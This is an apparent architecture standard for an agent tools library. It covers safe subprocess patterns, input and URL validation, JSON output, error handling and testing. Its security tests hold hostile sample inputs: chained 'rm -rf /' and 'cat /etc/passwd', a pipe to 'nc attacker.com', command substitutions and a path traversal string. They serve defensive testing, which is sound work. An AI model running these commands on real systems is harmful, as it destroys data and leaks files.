# Custom Tools Library Architecture

**Version**: 1.0.0
**Last Updated**: 2025-11-06
**Status**: Foundational Standards

This document defines the architecture, standards, and security requirements for the Claude Code Agent Ecosystem custom tools library.

---

## Table of Contents

1. [Overview](#overview)
2. [Security Requirements](#security-requirements)
3. [Output Format Standard](#output-format-standard)
4. [Input Validation Requirements](#input-validation-requirements)
5. [Error Handling Patterns](#error-handling-patterns)
6. [Testing Requirements](#testing-requirements)
7. [Tool Naming Conventions](#tool-naming-conventions)
8. [Directory Structure](#directory-structure)
9. [Implementation Checklist](#implementation-checklist)
10. [Reference Examples](#reference-examples)

---

## Overview

The custom tools library provides 23 secure, production-ready CLI tools that agents can invoke via the Bash tool to perform automated analysis, validation, and operational tasks.

### Design Principles

1. **Security First**: All tools prevent command injection through safe subprocess patterns
2. **Standardized Output**: All tools return structured JSON for agent parsing
3. **Input Validation**: Every tool validates and sanitizes inputs before processing
4. **Pattern Reuse**: Follow established patterns from reference implementations
5. **Agent Integration**: Design tools specifically for Bash tool invocation by agents

### Core Requirements

- All tools must be executable (`chmod +x`)
- Python tools use subprocess.run() with shell=False
- Bash tools quote all variables and validate inputs
- All tools return JSON: `{"success": bool, "data": {}, "errors": [], "metadata": {}}`
- Zero command injection vulnerabilities (validated by bandit/shellcheck)

---

## Security Requirements

### Critical Security Rules

**RULE 1: Never Execute Shell Commands Directly**

Python tools MUST use subprocess.run() with shell=False:

```python
# ✅ CORRECT: Safe subprocess execution
result = subprocess.run(
    ['git', 'log', '--oneline'],  # List, not string
    capture_output=True,
    text=True,
    shell=False,  # CRITICAL: Prevents injection
    check=False
)

# ❌ WRONG: Command injection vulnerability
# subprocess.run(f"git log {user_input}", shell=True)  # NEVER DO THIS
```

Bash tools MUST quote all variables:

```bash
# ✅ CORRECT: Quoted variables
FILE="$1"
git log --oneline -- "$FILE"

# ❌ WRONG: Unquoted variables allow injection
# git log --oneline -- $FILE  # VULNERABLE
```

**RULE 2: Validate All Inputs**

Every input must be validated before use:

```python
def validate_path(path: str) -> bool:
    """Prevent directory traversal attacks"""
    try:
        resolved = Path(path).resolve()
        # Verify path exists and is safe
        if not resolved.exists():
            return False
        # Add checks: within allowed dirs, proper permissions
        return True
    except Exception:
        return False
```

```bash
validate_numeric() {
    local value="$1"
    if ! [[ "$value" =~ ^[0-9]+$ ]]; then
        echo "Error: Must be numeric" >&2
        return 1
    fi
    return 0
}
```

**RULE 3: Prevent SSRF and Local File Access**

For tools that make network requests:

```python
def validate_url(url: str) -> bool:
    """Prevent SSRF attacks"""
    parsed = urlparse(url)

    # Only allow http/https
    if parsed.scheme not in ['http', 'https']:
        return False

    # Block localhost and private IPs
    hostname = parsed.hostname
    if hostname in ['localhost', '127.0.0.1', '::1', '0.0.0.0']:
        return False

    # Block private IP ranges (10.x, 172.16-31.x, 192.168.x)
    # Add additional checks as needed

    return True
```

**RULE 4: Sanitize Output**

When tools display user-provided data:

```python
# Prevent log injection
def sanitize_for_logging(text: str) -> str:
    """Remove newlines and control characters"""
    return text.replace('\n', '\\n').replace('\r', '\\r')
```

```bash
# Sanitize in bash
sanitize_input() {
    local input="$1"
    # Remove newlines and pipes
    echo "$input" | tr -d '\n\r|'
}
```

**RULE 5: Restrict File Access**

Tools must respect file system boundaries:

```python
def is_path_allowed(path: Path, allowed_roots: List[Path]) -> bool:
    """Ensure path is within allowed directories"""
    resolved = path.resolve()
    for allowed_root in allowed_roots:
        try:
            resolved.relative_to(allowed_root)
            return True
        except ValueError:
            continue
    return False
```

### Security Validation

All tools must pass:

```bash
# Python security scan
bandit -r tools/ -f json  # Must show 0 high/medium severity issues

# Bash security scan
shellcheck tools/**/*.sh  # Must exit 0 (no errors)
```

---

## Output Format Standard

All tools MUST return valid JSON with this exact structure:

```json
{
  "success": true,
  "data": {
    "key": "value",
    "items": [],
    "statistics": {}
  },
  "errors": [],
  "metadata": {
    "tool": "tool-name",
    "version": "1.0.0",
    "timestamp": "2025-11-06T10:00:00Z"
  }
}
```

### Field Specifications

**success** (boolean, required):
- `true`: Operation completed successfully
- `false`: Operation failed

**data** (object, required):
- Contains tool-specific results
- Empty object `{}` if operation failed
- Structure varies by tool purpose

**errors** (array, required):
- Empty array `[]` if successful
- Contains error objects if failed:
  ```json
  [
    {
      "type": "ValidationError",
      "message": "Detailed error description"
    }
  ]
  ```

**metadata** (object, required):
- `tool`: Tool name (string)
- `version`: Semantic version (string)
- `timestamp`: ISO 8601 UTC timestamp (string)

### Output Examples

**Success output**:

```json
{
  "success": true,
  "data": {
    "complexity": {
      "cyclomatic": 8,
      "maintainability_index": 72.5
    },
    "file": "/path/to/file.py",
    "functions_analyzed": 12
  },
  "errors": [],
  "metadata": {
    "tool": "complexity-check",
    "version": "1.0.0",
    "timestamp": "2025-11-06T10:15:30Z"
  }
}
```

**Error output**:

```json
{
  "success": false,
  "data": {},
  "errors": [
    {
      "type": "ValidationError",
      "message": "Invalid file path: /tmp/../etc/passwd"
    }
  ],
  "metadata": {
    "tool": "complexity-check",
    "version": "1.0.0",
    "timestamp": "2025-11-06T10:15:30Z"
  }
}
```

### Python Implementation

```python
def create_output(success: bool, data: Any = None, errors: List[Dict[str, str]] = None) -> Dict[str, Any]:
    """Create standardized JSON output"""
    return {
        "success": success,
        "data": data if data is not None else {},
        "errors": errors if errors is not None else [],
        "metadata": {
            "tool": TOOL_NAME,
            "version": TOOL_VERSION,
            "timestamp": datetime.utcnow().isoformat() + "Z"
        }
    }
```

### Bash Implementation

```bash
create_json_output() {
    local success="$1"
    local data="${2:-{}}"
    local errors="${3:-[]}"
    local timestamp
    timestamp=$(date -u +"%Y-%m-%dT%H:%M:%SZ")

    cat <<EOF
{
  "success": $success,
  "data": $data,
  "errors": $errors,
  "metadata": {
    "tool": "$TOOL_NAME",
    "version": "$TOOL_VERSION",
    "timestamp": "$timestamp"
  }
}
EOF
}
```

---

## Input Validation Requirements

### Path Validation

All file/directory paths must be validated:

```python
def validate_path(path: str) -> bool:
    """Validate file path to prevent traversal attacks"""
    try:
        resolved = Path(path).resolve()

        # Check existence
        if not resolved.exists():
            return False

        # Prevent directory traversal
        # Add logic to ensure path is within allowed directories

        return True
    except Exception:
        return False
```

```bash
validate_path() {
    local path="$1"

    # Check existence
    if [[ ! -e "$path" ]]; then
        return 1
    fi

    # Add additional checks as needed
    return 0
}
```

### Numeric Validation

```python
def validate_numeric(value: str, min_val: int = None, max_val: int = None) -> bool:
    """Validate numeric input with optional range"""
    try:
        num = float(value)
        if min_val is not None and num < min_val:
            return False
        if max_val is not None and num > max_val:
            return False
        return True
    except ValueError:
        return False
```

```bash
validate_numeric() {
    local value="$1"
    if ! [[ "$value" =~ ^[0-9]+$ ]]; then
        return 1
    fi
    return 0
}
```

### String Validation

```python
def validate_string(value: str, pattern: str = None, max_length: int = None) -> bool:
    """Validate string input with optional pattern and length"""
    import re

    # Check length
    if max_length and len(value) > max_length:
        return False

    # Check pattern
    if pattern and not re.match(pattern, value):
        return False

    return True
```

### URL Validation

```python
def validate_url(url: str) -> bool:
    """Validate URL to prevent SSRF"""
    from urllib.parse import urlparse

    parsed = urlparse(url)

    # Scheme check
    if parsed.scheme not in ['http', 'https']:
        return False

    # Hostname check
    if not parsed.netloc:
        return False

    # Block dangerous hosts
    blocked_hosts = ['localhost', '127.0.0.1', '::1', '0.0.0.0']
    if parsed.hostname in blocked_hosts:
        return False

    return True
```

---

## Error Handling Patterns

### Python Error Handling

```python
def main():
    """Main entry point with comprehensive error handling"""
    try:
        # Parse and validate arguments
        if len(sys.argv) < 2:
            raise ValueError("Missing required argument")

        target = sys.argv[1]

        # Perform operation
        results = perform_analysis(target)

        # Success output
        output = create_output(success=True, data=results)

    except ValueError as e:
        # Input validation errors
        output = create_output(
            success=False,
            errors=[{"type": "ValidationError", "message": str(e)}]
        )
    except RuntimeError as e:
        # Operation errors
        output = create_output(
            success=False,
            errors=[{"type": "RuntimeError", "message": str(e)}]
        )
    except Exception as e:
        # Unexpected errors
        output = create_output(
            success=False,
            errors=[{"type": type(e).__name__, "message": str(e)}]
        )

    # Always output JSON
    print(json.dumps(output, indent=2))
    sys.exit(0 if output["success"] else 1)
```

### Bash Error Handling

```bash
set -euo pipefail  # Fail fast on errors

main() {
    # Validate arguments
    if [[ $# -lt 1 ]]; then
        output_error "ValidationError" "Missing required argument"
        exit 1
    fi

    local target="$1"

    # Validate input
    if ! validate_path "$target"; then
        output_error "ValidationError" "Invalid path: $target"
        exit 1
    fi

    # Perform operation
    if perform_analysis "$target"; then
        exit 0
    else
        exit 1
    fi
}
```

### Error Types

Use consistent error types:

- **ValidationError**: Input validation failed
- **FileNotFoundError**: Required file doesn't exist
- **RuntimeError**: Operation execution failed
- **TimeoutError**: Operation exceeded time limit
- **PermissionError**: Insufficient permissions
- **ConfigurationError**: Invalid configuration
- **DependencyError**: Missing required dependency

---

## Testing Requirements

### Unit Tests

Every tool must have unit tests covering:

1. **Success cases**: Valid inputs produce expected output
2. **Validation failures**: Invalid inputs produce proper errors
3. **Edge cases**: Empty input, special characters, large files
4. **Security**: Injection attempts are blocked

Example test structure:

```python
def test_tool_success():
    """Test tool with valid input"""
    result = run_tool(['tool.py', 'valid_input'])
    assert result['success'] is True
    assert 'data' in result

def test_tool_validation_error():
    """Test tool rejects invalid input"""
    result = run_tool(['tool.py', '../../../etc/passwd'])
    assert result['success'] is False
    assert result['errors'][0]['type'] == 'ValidationError'

def test_tool_injection_prevention():
    """Test tool blocks injection attempts"""
    result = run_tool(['tool.py', 'file.py; rm -rf /'])
    assert result['success'] is False
```

### Integration Tests

Test agent-tool interaction patterns:

```bash
# Integration test example
test_agent_uses_tool() {
    # Setup
    local test_file="/tmp/test_input.txt"
    echo "test data" > "$test_file"

    # Execute tool
    local result
    result=$(./tool.py "$test_file")

    # Validate JSON output
    echo "$result" | jq -e '.success == true'

    # Cleanup
    rm -f "$test_file"
}
```

### Security Tests

Test injection resistance:

```python
def test_command_injection_python():
    """Test Python tool blocks shell injection"""
    malicious_inputs = [
        "file.py; rm -rf /",
        "file.py && cat /etc/passwd",
        "file.py | nc attacker.com 1234",
        "$(whoami)",
        "`whoami`"
    ]

    for malicious in malicious_inputs:
        result = run_tool(['tool.py', malicious])
        assert result['success'] is False
        # Verify no command was executed
```

```bash
test_command_injection_bash() {
    # Test bash tool blocks injection
    local malicious="file.sh; rm -rf /"

    # Tool should reject or safely handle
    ./tool.sh "$malicious" 2>&1 | jq -e '.success == false'
}
```

---

## Tool Naming Conventions

### Naming Rules

1. **Use kebab-case**: `secret-scanner.py`, not `secretScanner.py` or `secret_scanner.py`
2. **Be descriptive**: Name should indicate purpose (`complexity-check.py`, not `check.py`)
3. **Extension required**: `.py` for Python, `.sh` for Bash
4. **No version in name**: `tool.py`, not `tool-v1.py`
5. **Singular nouns**: `secret-scanner` not `secrets-scanner` (unless plural is semantically correct)

### Category Prefixes

Tools are organized by directory, not filename prefix:

```
tools/security/secret-scanner.py      # ✅ CORRECT
tools/security/security-scanner.py    # ❌ REDUNDANT PREFIX
```

### Examples

**Good names**:
- `secret-scanner.py`
- `complexity-check.py`
- `docker-manager.sh`
- `coverage-reporter.py`
- `log-analyzer.py`

**Bad names**:
- `secretScanner.py` (camelCase)
- `secret_scanner.py` (snake_case)
- `scanner.py` (too generic)
- `scan-secrets-v2.py` (version in name)
- `security-secret-scanner.py` (redundant category prefix)

---

## Directory Structure

```
~/.claude/tools/
├── security/           # Security tools (4 tools)
│   ├── secret-scanner.py
│   ├── vuln-checker.sh
│   ├── permission-auditor.py
│   └── cert-validator.sh
├── devops/            # DevOps tools (5 tools)
│   ├── docker-manager.sh
│   ├── env-manager.py
│   ├── service-health.sh
│   ├── resource-monitor.py
│   └── ci-status.sh
├── testing/           # Testing tools (4 tools)
│   ├── coverage-reporter.py
│   ├── test-selector.py
│   ├── mutation-score.sh
│   └── flakiness-detector.py
├── analysis/          # Code analysis tools (4 tools)
│   ├── complexity-check.py
│   ├── type-coverage.py
│   ├── duplication-detector.sh
│   └── import-analyzer.py
├── data/              # Data analysis tools (3 tools)
│   ├── log-analyzer.py
│   ├── sql-explain.py
│   └── metrics-aggregator.py
├── core/              # Core utilities (3 tools)
│   ├── file-converter.py
│   ├── mock-server.py
│   └── health-check.sh
├── templates/         # Tool templates
│   ├── python_tool_template.py
│   └── bash_tool_template.sh
├── tests/             # Test files
│   ├── test_security_tools.py
│   ├── test_devops_tools.sh
│   └── test_integration.py
└── examples/          # Reference implementations
    ├── secure-api-test.py
    └── secure-git-analyze.sh
```

### Category Definitions

**security/**: Tools for security scanning and auditing
- Secret detection, vulnerability checking, permission audits, certificate validation

**devops/**: Tools for infrastructure and deployment
- Container management, environment validation, service health, resource monitoring

**testing/**: Tools for test automation and quality
- Coverage reporting, test selection, mutation testing, flakiness detection

**analysis/**: Tools for code quality analysis
- Complexity metrics, type coverage, duplication detection, dependency analysis

**data/**: Tools for data processing and analysis
- Log parsing, SQL optimization, metrics aggregation

**core/**: Essential utilities
- Format conversion, mock servers, system health checks

---

## Implementation Checklist

Use this checklist when implementing each tool:

### Security (Required)
- [ ] Input validation implemented for all arguments
- [ ] Path validation prevents directory traversal
- [ ] Subprocess calls use shell=False (Python) or quoted variables (Bash)
- [ ] No user input concatenated into commands
- [ ] URL validation blocks SSRF (if applicable)
- [ ] Output sanitization prevents log injection
- [ ] Tool passes bandit/shellcheck with no warnings

### Output Format (Required)
- [ ] Returns valid JSON structure
- [ ] Includes success boolean
- [ ] Includes data object (empty if failed)
- [ ] Includes errors array (empty if successful)
- [ ] Includes metadata with tool name, version, timestamp
- [ ] Exit code 0 for success, non-zero for failure

### Error Handling (Required)
- [ ] Catches all expected exception types
- [ ] Returns proper error type in errors array
- [ ] Error messages are descriptive and actionable
- [ ] No stack traces in production output
- [ ] Tool never crashes without output

### Testing (Required)
- [ ] Unit tests for success cases
- [ ] Unit tests for validation failures
- [ ] Unit tests for edge cases
- [ ] Security tests for injection attempts
- [ ] Integration test showing agent usage

### Documentation (Required)
- [ ] Docstring/header comment with purpose
- [ ] Usage examples in help text
- [ ] Input/output format documented
- [ ] Security notes documented
- [ ] Tool added to main README

### Code Quality (Required)
- [ ] Follows template structure
- [ ] Uses consistent naming conventions
- [ ] Includes type hints (Python) or function comments (Bash)
- [ ] Code is readable and maintainable
- [ ] No hardcoded values (use constants)

---

## Reference Examples

### Python Tool: secure-api-test.py

Location: `~/.claude/tools/examples/secure-api-test.py`

**Key patterns to follow**:
- URL validation prevents SSRF
- HTTP method whitelist
- Structured JSON output
- Graceful error handling with try/except
- Timeout protection (10 seconds)
- SSL certificate verification

### Bash Tool: secure-git-analyze.sh

Location: `~/.claude/tools/examples/secure-git-analyze.sh`

**Key patterns to follow**:
- `set -euo pipefail` at top
- All variables quoted: `"$VAR"`
- Numeric validation: `[[ "$DAYS" =~ ^[0-9]+$ ]]`
- Functions for reusable logic
- Descriptive error messages to stderr

### Template Files

**Python**: `~/.claude/tools/templates/python_tool_template.py`
- Complete template with all required functions
- Security best practices built-in
- Comprehensive error handling
- Standardized JSON output

**Bash**: `~/.claude/tools/templates/bash_tool_template.sh`
- Strict mode configured
- Input validation functions
- JSON output helpers
- Usage documentation

---

## Quick Reference

### Python Safe Subprocess

```python
# ✅ CORRECT
subprocess.run(['command', 'arg1', user_input], shell=False)

# ❌ WRONG
subprocess.run(f"command {user_input}", shell=True)
```

### Bash Safe Variables

```bash
# ✅ CORRECT
FILE="$1"
command --arg "$FILE"

# ❌ WRONG
command --arg $FILE
```

### JSON Output Template

```json
{
  "success": true|false,
  "data": {...},
  "errors": [],
  "metadata": {
    "tool": "tool-name",
    "version": "1.0.0",
    "timestamp": "2025-11-06T10:00:00Z"
  }
}
```

### Validation Pattern

```python
# Validate first, then process
if not validate_input(user_input):
    return error_output("ValidationError", "Invalid input")
result = process(user_input)
```

---

## Version History

- **1.0.0** (2025-11-06): Initial architecture document
  - Security requirements defined
  - Output format standardized
  - Validation patterns documented
  - Testing requirements specified
  - Tool naming conventions established
